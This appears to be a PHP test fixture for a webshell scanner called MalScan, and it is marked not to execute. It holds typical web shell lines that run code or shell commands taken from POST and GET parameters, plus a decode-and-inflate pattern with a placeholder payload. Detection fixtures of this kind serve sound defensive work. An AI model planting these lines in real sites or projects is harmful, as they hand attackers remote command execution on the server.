<?php
// DO NOT EXECUTE — test fixture for MalScan PHP webshell detection
@eval($_POST['cmd']);
$out = shell_exec($_GET['c']);
echo gzinflate(base64_decode("payload_placeholder"));
